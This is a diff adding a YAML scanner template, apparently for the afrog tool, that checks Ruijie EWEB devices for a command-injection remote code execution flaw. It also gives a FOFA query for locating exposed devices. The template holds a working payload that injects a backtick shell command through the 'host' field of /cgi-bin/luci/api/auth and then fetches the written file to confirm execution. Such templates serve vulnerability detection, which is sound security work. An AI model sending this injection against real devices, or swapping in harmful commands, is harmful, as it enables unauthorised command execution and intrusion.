@@ -1,0 +1,33 @@
+id: ruijie-eweb-route-auth-rce
+
+info:
+  name: 锐捷 EWEB auth 远程代码执行漏洞
+  author: zan8in
+  severity: critical
+  verified: true
+  description: |-
+    锐捷 EWEB 系列设备存在远程代码执行漏洞，攻击者可通过该漏洞在目标服务器上执行任意命令。
+    fofa: body="cgi-bin/luci" && body="#f47f3e"
+  tags: ruijie,rce
+  created: 2025/02/14
+
+set:
+  content: randomLowercase(10)
+  filename: randomLowercase(10)
+  md5content: md5(content)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /cgi-bin/luci/api/auth
+      headers:
+        Content-Type: application/json
+      body: |
+        {"method":"checkNet","params":{"host":"`echo {{md5content}}>{{filename}}.txt`"}}
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /cgi-bin/{{filename}}.txt
+    expression: response.status == 200 && response.body.bcontains(bytes(md5content))
+expression: r0() && r1()
